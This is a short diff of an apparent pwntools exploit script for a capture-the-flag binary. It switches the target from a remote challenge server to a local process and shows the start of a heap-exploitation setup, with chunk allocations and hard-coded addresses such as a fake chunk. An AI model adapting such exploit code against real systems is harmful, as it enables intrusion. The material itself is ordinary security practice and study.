@@ -28,8 +28,8 @@ stdout = 0x602020
 fake = 0x6021C0
 
 while(1):
-	p = remote('123.56.52.128','45830')
-	# p = process('./pwn')
+	# p = remote('123.56.52.128','45830')
+	p = process('./pwn')
 	add(0x18,'aaa') #0
 	add(0x18,'bbb') #1
 	add(0x60,'ccc') #2
